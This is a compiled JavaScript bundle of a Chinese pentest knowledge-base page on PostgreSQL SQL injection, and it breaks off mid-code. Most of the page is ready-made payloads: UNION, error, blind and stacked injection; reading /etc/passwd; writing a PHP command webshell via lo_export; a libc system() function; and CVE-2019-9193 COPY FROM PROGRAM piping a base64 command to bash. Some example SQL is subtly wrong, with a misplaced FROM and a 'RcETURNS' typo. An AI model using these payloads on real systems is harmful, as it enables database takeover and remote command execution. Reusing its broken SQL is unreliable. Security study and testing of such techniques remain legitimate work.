"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[6203],{15041:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119163757705-29258d8f36b72812cfadc12eced51d10.png"},18956:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119152153449-4cb636268337e1a9e7d0156e7dda7ddf.png"},21055:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119165202120-eacdca4cd7d9292f64e65fee8dadae28.png"},28453:(e,f,c)=>{c.d(f,{R:()=>l,x:()=>r});var n=c(96540);const s={},d=n.createContext(s);function l(e){const f=n.useContext(d);return n.useMemo((function(){return"function"==typeof e?e(f):{...f,...e}}),[f,e])}function r(e){let f;return f=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),n.createElement(d.Provider,{value:f},e.children)}},45095:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119162044527-19968a2c58f9762369f95aa06a9f4e7a.png"},63317:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119151933175-8a08e138746f2673e83a255d81197bb2.png"},83886:(e,f,c)=>{c.r(f),c.d(f,{assets:()=>i,contentTitle:()=>r,default:()=>h,frontMatter:()=>l,metadata:()=>n,toc:()=>a});const n=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","title":"\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","description":"\u8054\u5408\u67e5\u8be2(UNION)\u6ce8\u5165","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/06.PostgreSQL/02.\u5404\u79cd\u6ce8\u5165\u624b\u6cd5.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/06.PostgreSQL","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL/\u5e38\u7528\u7b26\u53f7:\u51fd\u6570:\u8bed\u53e5\u5f52\u7c7b"},"next":{"title":"\u7ed5\u8fc7\u6280\u5de7","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL/\u7ed5\u8fc7\u6280\u5de7"}}');var s=c(74848),d=c(28453);const l={},r=void 0,i={},a=[{value:"\u8054\u5408\u67e5\u8be2(UNION)\u6ce8\u5165",id:"\u8054\u5408\u67e5\u8be2union\u6ce8\u5165",level:2},{value:"\u6ce8\u5165\u6d41\u7a0b",id:"\u6ce8\u5165\u6d41\u7a0b",level:3},{value:"\u5b57\u6bb5\u6570",id:"\u5b57\u6bb5\u6570",level:4},{value:"\u663e\u793a\u4f4d",id:"\u663e\u793a\u4f4d",level:4},{value:"\u83b7\u53d6\u6570\u636e",id:"\u83b7\u53d6\u6570\u636e",level:4},{value:"\u62a5\u9519\u6ce8\u5165",id:"\u62a5\u9519\u6ce8\u5165",level:2},{value:"\u6982\u5ff5",id:"\u6982\u5ff5",level:3},{value:"\u76f8\u5173\u51fd\u6570",id:"\u76f8\u5173\u51fd\u6570",level:3},{value:"CAST",id:"cast",level:4},{value:"::\u8fd0\u7b97\u7b26",id:"\u8fd0\u7b97\u7b26",level:4},{value:"\u76f2\u6ce8",id:"\u76f2\u6ce8",level:2},{value:"\u5e03\u5c14\u76f2\u6ce8",id:"\u5e03\u5c14\u76f2\u6ce8",level:3},{value:"\u6838\u5fc3\u601d\u8def",id:"\u6838\u5fc3\u601d\u8def",level:4},{value:"\u5e38\u7528\u51fd\u6570",id:"\u5e38\u7528\u51fd\u6570",level:4},{value:"\u4e3e\u4f8b",id:"\u4e3e\u4f8b",level:4},{value:"\u65f6\u95f4\u76f2\u6ce8",id:"\u65f6\u95f4\u76f2\u6ce8",level:3},{value:"\u6838\u5fc3\u601d\u8def",id:"\u6838\u5fc3\u601d\u8def-1",level:4},{value:"\u5e38\u7528\u51fd\u6570",id:"\u5e38\u7528\u51fd\u6570-1",level:4},{value:"\u4e3e\u4f8b",id:"\u4e3e\u4f8b-1",level:4},{value:"\u5806\u53e0\u6ce8\u5165",id:"\u5806\u53e0\u6ce8\u5165",level:2},{value:"Order By\u6ce8\u5165",id:"order-by\u6ce8\u5165",level:2},{value:"\u6587\u4ef6\u8bfb\u5199",id:"\u6587\u4ef6\u8bfb\u5199",level:2},{value:"\u8bfb\u6587\u4ef6",id:"\u8bfb\u6587\u4ef6",level:3},{value:"\u5199\u6587\u4ef6",id:"\u5199\u6587\u4ef6",level:3},{value:"\u5229\u7528copy",id:"\u5229\u7528copy",level:4},{value:"\u5927\u5bf9\u8c61\u6570\u636e\u5199\u5165",id:"\u5927\u5bf9\u8c61\u6570\u636e\u5199\u5165",level:4},{value:"\u547d\u4ee4\u6267\u884c",id:"\u547d\u4ee4\u6267\u884c",level:2},{value:"\u4f4e\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c",id:"\u4f4e\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c",level:3},{value:"\u9ad8\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c",id:"\u9ad8\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c",level:3},{value:"CVE-2019-9193",id:"cve-2019-9193",level:4},{value:"UDF\u63d0\u6743",id:"udf\u63d0\u6743",level:4}];function t(e){const f={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,d.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(f.h2,{id:"\u8054\u5408\u67e5\u8be2union\u6ce8\u5165",children:"\u8054\u5408\u67e5\u8be2(UNION)\u6ce8\u5165"}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsx)(f.p,{children:"[!TIP]"}),"\n",(0,s.jsx)(f.p,{children:"\u548c\u4e4b\u524d\u7684\u5176\u4ed6\u6570\u636e\u5e93\u4e00\u6837\uff0c\u5927\u6982\u8bb0\u5f55\u4e00\u4e0b\u8bed\u53e5"}),"\n"]}),"\n",(0,s.jsx)(f.h3,{id:"\u6ce8\u5165\u6d41\u7a0b",children:"\u6ce8\u5165\u6d41\u7a0b"}),"\n",(0,s.jsxs)(f.ol,{children:["\n",(0,s.jsx)(f.li,{children:"\u786e\u5b9a\u5b57\u6bb5\u6570"}),"\n",(0,s.jsx)(f.li,{children:"\u786e\u5b9a\u663e\u4f4d"}),"\n",(0,s.jsx)(f.li,{children:"\u83b7\u53d6\u6570\u636e"}),"\n"]}),"\n",(0,s.jsx)(f.h4,{id:"\u5b57\u6bb5\u6570",children:"\u5b57\u6bb5\u6570"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select * from table_name from column_name = 'xxx' order by 3 -- \u6b63\u5e38\nselect * from table_name from column_name = 'xxx' order by 4 -- \u4e0d\u6b63\u5e38\n"})}),"\n",(0,s.jsx)(f.h4,{id:"\u663e\u793a\u4f4d",children:"\u663e\u793a\u4f4d"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select * from table_name from column_name = 'xxx' union select '1','2','3'\n"})}),"\n",(0,s.jsx)(f.h4,{id:"\u83b7\u53d6\u6570\u636e",children:"\u83b7\u53d6\u6570\u636e"}),"\n",(0,s.jsx)(f.p,{children:"\u5047\u8bbe\u663e\u4f4d\u662f2\uff0c\u5217\u4e3e\u51e0\u4e2a\uff0c\u629b\u7816\u5f15\u7389"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"# \u67e5\u8be2\u7248\u672c\nselect * from table_name from column_name = 'xxx' union select '1',version(),'3'\n# \u67e5\u8be2\u7528\u6237\nselect * from table_name from column_name = 'xxx' union select '1',user,'3'\n# \u5f53\u524d\u6570\u636e\u5e93\nselect * from table_name from column_name = 'xxx' union select '1',current_database(),'3'\n"})}),"\n",(0,s.jsx)(f.h2,{id:"\u62a5\u9519\u6ce8\u5165",children:"\u62a5\u9519\u6ce8\u5165"}),"\n",(0,s.jsx)(f.p,{children:"\u62a5\u9519\u6ce8\u5165\u5728postgresql\u5176\u5b9e\u4e0d\u592a\u5e38\u89c1\uff0c\u7531\u4e8epostgresql\u9ed8\u8ba4\u652f\u6301\u5806\u53e0\u67e5\u8be2\uff0c\u6240\u4ee5\u901a\u5e38\u4f7f\u7528\u5806\u53e0\u67e5\u8be2\u5c31\u76f4\u63a5getshell\u4e86"}),"\n",(0,s.jsx)(f.h3,{id:"\u6982\u5ff5",children:"\u6982\u5ff5"}),"\n",(0,s.jsx)(f.p,{children:"\u548c\u5176\u4ed6\u4e00\u6837\uff0c\u90fd\u662f\u4f9d\u8d56\u4e8e\u8ba9sql\u8bed\u53e5\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u629b\u51fa\u5f02\u5e38\u4fe1\u606f\uff0c\u4e3b\u8981\u662f\u7c7b\u578b\u8f6c\u6362\u3002"}),"\n",(0,s.jsx)(f.h3,{id:"\u76f8\u5173\u51fd\u6570",children:"\u76f8\u5173\u51fd\u6570"}),"\n",(0,s.jsx)(f.h4,{id:"cast",children:"CAST"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select cast((select version()) as int);\nselect title from test where title='a' and cast((select version()) as int) = 1;\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119151933175",src:c(63317).A+"",width:"3568",height:"106"})}),"\n",(0,s.jsx)(f.h4,{id:"\u8fd0\u7b97\u7b26",children:"::\u8fd0\u7b97\u7b26"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select version()::text::int;\nselect title from test where title='a' and (select version()::text::int) = 1;\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119152153449",src:c(18956).A+"",width:"3582",height:"92"})}),"\n",(0,s.jsx)(f.h2,{id:"\u76f2\u6ce8",children:"\u76f2\u6ce8"}),"\n",(0,s.jsx)(f.h3,{id:"\u5e03\u5c14\u76f2\u6ce8",children:"\u5e03\u5c14\u76f2\u6ce8"}),"\n",(0,s.jsx)(f.h4,{id:"\u6838\u5fc3\u601d\u8def",children:"\u6838\u5fc3\u601d\u8def"}),"\n",(0,s.jsx)(f.p,{children:"\u6839\u636e\u9875\u9762\u8fd4\u56de\u7684\u60c5\u51b5\u6765\u5224\u65adtrue/false\uff0c\u7136\u540e\u4e00\u4f4d\u4e00\u4f4d\u7684\u5224\u65ad\u662f\u5426\u6b63\u786e"}),"\n",(0,s.jsx)(f.h4,{id:"\u5e38\u7528\u51fd\u6570",children:"\u5e38\u7528\u51fd\u6570"}),"\n",(0,s.jsxs)(f.ul,{children:["\n",(0,s.jsxs)(f.li,{children:["\n",(0,s.jsx)(f.p,{children:"ascii()"}),"\n"]}),"\n",(0,s.jsxs)(f.li,{children:["\n",(0,s.jsx)(f.p,{children:"substring()/substr()"}),"\n"]}),"\n",(0,s.jsxs)(f.li,{children:["\n",(0,s.jsx)(f.p,{children:"length()"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(f.h4,{id:"\u4e3e\u4f8b",children:"\u4e3e\u4f8b"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select title from test where title='a' and 2*2 = 4; -- true\nselect title from test where title='a' and 2*2 = 5; -- false\nselect title from test where title='a' and ascii(substring((select current_database()),1,1)) > 99; -- true\nselect title from test where title='a' and ascii(substring((select current_database()),1,1)) > 120; -- false\nselect title from test where title='a' and ascii(substring((select current_database()),1,1)) = 116; -- true\n"})}),"\n",(0,s.jsx)(f.h3,{id:"\u65f6\u95f4\u76f2\u6ce8",children:"\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,s.jsx)(f.h4,{id:"\u6838\u5fc3\u601d\u8def-1",children:"\u6838\u5fc3\u601d\u8def"}),"\n",(0,s.jsx)(f.p,{children:"\u5728\u5e03\u5c14\u76f2\u6ce8\u7684\u57fa\u7840\u4e0a\uff0c\u901a\u8fc7\u4e00\u4e9b\u5224\u5b9a\u8bed\u53e5\uff0c\u6765\u770b\u770b\u662f\u5426\u5b58\u5728\u5ef6\u65f6\u7b49\u3002"}),"\n",(0,s.jsx)(f.h4,{id:"\u5e38\u7528\u51fd\u6570-1",children:"\u5e38\u7528\u51fd\u6570"}),"\n",(0,s.jsxs)(f.ul,{children:["\n",(0,s.jsxs)(f.li,{children:["\n",(0,s.jsx)(f.p,{children:"pg_sleep()"}),"\n"]}),"\n",(0,s.jsxs)(f.li,{children:["\n",(0,s.jsx)(f.p,{children:"case when(expr1) then result1 else result2 end"}),"\n"]}),"\n",(0,s.jsxs)(f.li,{children:["\n",(0,s.jsx)(f.p,{children:"pg_sleep_for(interval)"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(f.h4,{id:"\u4e3e\u4f8b-1",children:"\u4e3e\u4f8b"}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsxs)(f.p,{children:["[!TIP|style",":flat","]"]}),"\n",(0,s.jsxs)(f.p,{children:["\u5f53and\u540e\u9762\u7684\u6761\u4ef6\u4e0d\u80fd\u7528",(0,s.jsx)(f.code,{children:"expr1=expr2"}),"\u8fd9\u79cd\uff0c\u53ef\u4ee5\u548coracle\u4e00\u6837\u4f7f\u7528",(0,s.jsx)(f.code,{children:"is null"}),"\u6765\u5224\u65ad"]}),"\n"]}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"# \u62fc\u63a5\u5728\u8bed\u53e5\u4e2d\nselect title from test where title='a' and (select pg_sleep_for('5 sec')) is null;\n# \u5806\u53e0\nselect title from test where title='a';select pg_sleep_for('5 sec');\n# \u52a0\u5165\u5224\u65ad\u6761\u4ef6\nselect title from test where title='a' and (select case when((ascii(substring((select current_database()),1,1))) = 116) then pg_sleep(5) else null end) is null;\n"})}),"\n",(0,s.jsx)(f.h2,{id:"\u5806\u53e0\u6ce8\u5165",children:"\u5806\u53e0\u6ce8\u5165"}),"\n",(0,s.jsxs)(f.p,{children:["postgresql\u548cmssql\u4e00\u6837\uff0c\u9ed8\u8ba4\u652f\u6301\u591a\u8bed\u53e5\uff0c\u95ed\u5408\u524d\u8bed\u53e5\uff0c\u518d\u4f7f\u7528",(0,s.jsx)(f.code,{children:";"}),"\u5206\u9694\u524d\u540e\u7684\u8bed\u53e5\uff0c\u4ee5\u8fbe\u5230\u5806\u53e0\u67e5\u8be2\u7684\u76ee\u7684\u3002"]}),"\n",(0,s.jsxs)(f.p,{children:["\u7531\u4e8e\u5806\u53e0\u67e5\u8be2\u7684\u7279\u6b8a\u6027\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528postgresql\u7684\u7279\u6b8a\u4f11\u7720\u51fd\u6570",(0,s.jsx)(f.code,{children:"pg_sleep()"}),"\u5feb\u901f\u5224\u65ad\u662f\u5426\u662fpostgresql"]}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.strong,{children:"Payload:"})}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"?id=1';select pg_sleep(5) -- aaa\n"})}),"\n",(0,s.jsxs)(f.p,{children:["\u5728\u5224\u65ad\u51fa\u6ce8\u5165\u70b9\u4ee5\u53ca\u662fpostgresql\u4e14\u53ef\u5806\u53e0\u67e5\u8be2\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528",(0,s.jsx)(f.a,{href:"#CVE-2019-9193",children:(0,s.jsx)(f.code,{children:"CVE-2019-9193"})}),"\uff0c\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u53cd\u5f39shell\uff0c\u4ece\u7248\u672c",(0,s.jsx)(f.a,{href:"https://www.postgresql.org/docs/9.3/release-9-3.html",children:"9.3"}),"\u5f00\u59cb\uff0cPostgres\u65b0\u589e\u4e86\u4e00\u4e2a\u201c",(0,s.jsx)(f.a,{href:"https://paquier.xyz/postgresql-2/postgres-9-3-feature-highlight-copy-tofrom-program/",children:"COPY TO/FROM PROGRAM"}),"\u201d\u529f\u80fd\u3002\u8fd9\u4e2a\u529f\u80fd\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5141\u8bb8\u6570\u636e\u5e93\u7684\u8d85\u7ea7\u7528\u6237\u4ee5\u53ca",(0,s.jsx)(f.code,{children:"pg_read_server_files"}),"\u7ec4\u4e2d\u7684\u4efb\u4f55\u7528\u6237\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4"]}),"\n",(0,s.jsx)(f.h2,{id:"order-by\u6ce8\u5165",children:"Order By\u6ce8\u5165"}),"\n",(0,s.jsxs)(f.p,{children:["order by \u6ce8\u5165\u901a\u5e38\u51fa\u73b0\u5728\u6392\u5e8f\u4e2d\uff0c\u524d\u7aef\u5c55\u793a\u7684\u8868\u683c\uff0c\u67d0\u4e00\u5217\u9700\u8981\u8fdb\u884c\u5347\u5e8f\u6216\u8005\u964d\u5e8f\u6392\u5217\uff0c\u6216\u8005\u505a\u6392\u540d\u6bd4\u8f83\u7684\u65f6\u5019\u5e38\u5e38\u4f1a\u7528\u5230",(0,s.jsx)(f.code,{children:"order by"}),"\u6392\u5e8f\uff0c",(0,s.jsx)(f.code,{children:"order by"}),"\u5728select\u8bed\u53e5\u4e2d\uff0c\u7d27\u8ddf\u5728",(0,s.jsx)(f.code,{children:"where [where condition]"}),"\u540e\uff0c\u4e14order by \u6ce8\u5165\u65e0\u6cd5\u4f7f\u7528\u9884\u7f16\u8bd1\u6765\u9632\u5fa1\uff0c\u7531\u4e8eorder by \u540e\u9762\u9700\u8981\u7d27\u8ddf",(0,s.jsx)(f.code,{children:"column_name"}),"\uff0c\u800c\u9884\u7f16\u8bd1\u662f\u53c2\u6570\u5316\u5b57\u7b26\u4e32\uff0c\u800c",(0,s.jsx)(f.code,{children:"order by"}),"\u540e\u9762\u7d27\u8ddf\u5b57\u7b26\u4e32\u5c31\u4f1a\u63d0\u793a\u8bed\u6cd5\u9519\u8bef\uff0c\u901a\u5e38\u9632\u5fa1order by \u6ce8\u5165\u9700\u8981\u4f7f\u7528\u767d\u540d\u5355\u7684\u65b9\u5f0f\u3002"]}),"\n",(0,s.jsx)(f.p,{children:"\u901a\u8fc7order by \u5217\u540d\uff0c\u6839\u636e\u6392\u5e8f\u8fd4\u56de\u7684\u60c5\u51b5\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\uff0c\u6216\u8005\u4f7f\u7528\u8d85\u5927\u6570\uff0c\u6784\u6210SQL\u8bed\u53e5\u9519\u8bef"}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsxs)(f.p,{children:["[!TIP|style",":flat","]"]}),"\n",(0,s.jsxs)(f.p,{children:["postgresql \u7684order by \u6ce8\u5165\uff0c\u6d89\u53ca\u6761\u4ef6\u76f8\u5f53\u590d\u6742\uff0c\u7531\u4e8epostgresql order by \u540e\u9762\u8981\u7d27\u8ddftrue\uff0c\u6216\u8005false\uff0c\u9700\u8981\u4f7f\u7528",(0,s.jsx)(f.code,{children:"case...when...then...else...end"}),'\u8868\u8fbe\u5f0f\u5d4c\u5957SELECT\u548cCASE WHEN\u8bed\u53e5\uff0c\u76f4\u5230\u53ef\u4ee5\u5c06"\u5e03\u5c14\u76f2\u6ce8\u6210\u529f\u5229\u7528\uff0c\u7136\u540e\u7761\u77205\u79d2"\u8f6c\u6362\u4e3a"true\u6216false"']}),"\n",(0,s.jsx)(f.p,{children:"\u5982\u679c\u5f00\u542f\u4e86\u62a5\u9519\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528\u62a5\u9519\u6ce8\u5165"}),"\n"]}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select case when((select case when(select user = 'postgres') then (select true from PG_SLEEP(5)) else false end)) then true else false end;\nselect case when(select user = 'postgres') then (select 1 from pg_sleep(2)) else 1 end;\n"})}),"\n",(0,s.jsx)(f.h2,{id:"\u6587\u4ef6\u8bfb\u5199",children:"\u6587\u4ef6\u8bfb\u5199"}),"\n",(0,s.jsxs)(f.p,{children:["\u6587\u4ef6\u8bfb\u5199\u5728postgresql\u4e2d\u6bd4\u8f83\u65b9\u4fbf\u5229\u7528\uff0cpostgresql 8.1\u540e\u63d0\u4f9b\u4e86\u4e00\u7ec4\u73b0\u6210\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\uff08",(0,s.jsx)(f.code,{children:"pg_logdir_ls()"}),"\u3001",(0,s.jsx)(f.code,{children:"pg_ls_dir()"}),"\u3001",(0,s.jsx)(f.code,{children:"pg_file_rename()"}),"\u3001",(0,s.jsx)(f.code,{children:"pg_file_write()"}),"\u3001 ",(0,s.jsx)(f.code,{children:"pg_read_file()"}),"\u3001",(0,s.jsx)(f.code,{children:"pg_length_file()"}),"\uff09\u6765\u8bfb\u53d6/\u5199\u5165\uff0c\u4f46\u662f\u6709\u9650\u5236\uff0c\u56e0\u4e3a",(0,s.jsx)(f.code,{children:"pg_xxx"}),"\u8fd9\u4e2aadminpack\u5c06\u6743\u9650\u9650\u5236\u5728\u4e86",(0,s.jsx)(f.code,{children:"./postgresql/data"})]}),"\n",(0,s.jsx)(f.p,{children:"\u4e0b\u9762\u5217\u4e3e\u4e00\u4e2a\u53ef\u884c\u7684\u65b9\u6848"}),"\n",(0,s.jsx)(f.h3,{id:"\u8bfb\u6587\u4ef6",children:"\u8bfb\u6587\u4ef6"}),"\n",(0,s.jsx)(f.p,{children:"\u521b\u5efa\u6570\u636e\u8868\u5c06\u8bfb\u5230\u7684\u6587\u4ef6copy\u5165\u8868"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"drop table if exists test;\nCREATE TABLE test(t TEXT);\nCOPY test FROM '/etc/passwd';\nSELECT * FROM test;\n\n# \u5806\u53e0\uff0c\u53d8\u6210\u4e00\u53e5\ndrop table if exists test;CREATE TABLE test(t TEXT);COPY test FROM '/etc/passwd';SELECT * FROM test;\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119160535248",src:c(98152).A+"",width:"2172",height:"1208"})}),"\n",(0,s.jsx)(f.h3,{id:"\u5199\u6587\u4ef6",children:"\u5199\u6587\u4ef6"}),"\n",(0,s.jsx)(f.h4,{id:"\u5229\u7528copy",children:"\u5229\u7528copy"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"COPY (select '<?php phpinfo();?>') to '/tmp/1.php';\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119161416610",src:c(91258).A+"",width:"2136",height:"548"})}),"\n",(0,s.jsx)(f.h4,{id:"\u5927\u5bf9\u8c61\u6570\u636e\u5199\u5165",children:"\u5927\u5bf9\u8c61\u6570\u636e\u5199\u5165"}),"\n",(0,s.jsxs)(f.p,{children:[(0,s.jsx)(f.code,{children:"pg_largeobject"}),"\u8868\u4fdd\u5b58\u90a3\u4e9b\u6807\u8bb0\u7740\u201d\u5927\u5bf9\u8c61\u201d\u7684\u6570\u636e\u3002 \u4e00\u4e2a\u5927\u5bf9\u8c61\u662f\u4f7f\u7528\u5176\u521b\u5efa\u65f6\u5206\u914d\u7684 OID \u6807\u8bc6\u7684\u3002 \u6bcf\u4e2a\u5927\u5bf9\u8c61\u90fd\u5206\u89e3\u6210\u8db3\u591f\u5c0f\u7684\u5c0f\u6bb5\u6216\u8005\u201d\u9875\u9762\u201d\u4ee5\u4fbf\u4ee5\u884c\u7684\u5f62\u5f0f\u5b58\u50a8\u5728 ",(0,s.jsx)(f.code,{children:"pg_largeobject"}),"\u91cc\u3002 \u6bcf\u9875\u7684\u6570\u636e\u5b9a\u4e49\u4e3aLOBLKSIZE(\u76ee\u524d\u662fBLCKSZ/4\uff0c\u6216\u8005\u901a\u5e38\u662f 2K \u5b57\u8282)"]}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsx)(f.p,{children:"[!TIP]"}),"\n",(0,s.jsx)(f.p,{children:"\u4e0b\u9762UDF\u63d0\u6743\u4e5f\u662f\u7528\u7684\u8fd9\u4e2a\u65b9\u6cd5"}),"\n"]}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"SELECT lo_create(9999);\ndelete from pg_largeobject where loid=9999;\ninsert into pg_largeobject (loid,pageno,data) values(9999, 0, decode('3c3f706870204073797374656d2822245f4745545b636d645d22293b3f3e', 'hex'));  \n-- \u6216 insert into pg_largeobject values(9999,0,'<?php @system(\"$_GET[cmd]\");?>');\nSELECT lo_export(9999, '/tmp/shell.php');  \nSelect lo_unlink(9999);\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119165202120",src:c(21055).A+"",width:"1452",height:"122"})}),"\n",(0,s.jsx)(f.h2,{id:"\u547d\u4ee4\u6267\u884c",children:"\u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsx)(f.h3,{id:"\u4f4e\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c",children:"\u4f4e\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsxs)(f.p,{children:["\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528",(0,s.jsx)(f.code,{children:"/lib/libc.so.6"}),"\u6216\u8005\u662f",(0,s.jsx)(f.code,{children:"/lib64/libc.so.6"}),"\uff1b\u4e00\u822c",(0,s.jsx)(f.strong,{children:"8.2"}),"\u4ee5\u4e0b\u7684\u7248\u672c\u53ef\u4ee5"]}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsx)(f.p,{children:"\u672a\u5c1d\u8bd5"}),"\n"]}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;\nCREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT;\nselect system('id');\n"})}),"\n",(0,s.jsx)(f.h3,{id:"\u9ad8\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c",children:"\u9ad8\u7248\u672c\u7684\u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsx)(f.h4,{id:"cve-2019-9193",children:"CVE-2019-9193"}),"\n",(0,s.jsxs)(f.p,{children:[(0,s.jsx)(f.code,{children:"CVE-2019-9193"}),"\uff0c\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u53cd\u5f39shell\uff0c\u4ece\u7248\u672c",(0,s.jsx)(f.a,{href:"https://www.postgresql.org/docs/9.3/release-9-3.html",children:"9.3"}),"\u5f00\u59cb\uff0cPostgres\u65b0\u589e\u4e86\u4e00\u4e2a\u201c",(0,s.jsx)(f.a,{href:"https://paquier.xyz/postgresql-2/postgres-9-3-feature-highlight-copy-tofrom-program/",children:"COPY TO/FROM PROGRAM"}),"\u201d\u529f\u80fd\u3002\u8fd9\u4e2a\u529f\u80fd\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5141\u8bb8\u6570\u636e\u5e93\u7684\u8d85\u7ea7\u7528\u6237\u4ee5\u53ca",(0,s.jsx)(f.code,{children:"pg_read_server_files"}),"\u7ec4\u4e2d\u7684\u4efb\u4f55\u7528\u6237\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4"]}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.strong,{children:"Payload:"})}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'echo dG91Y2ggL3RtcC90ZXN0Cg==|base64 -d|bash';\nselect * from cmd_exec; -- 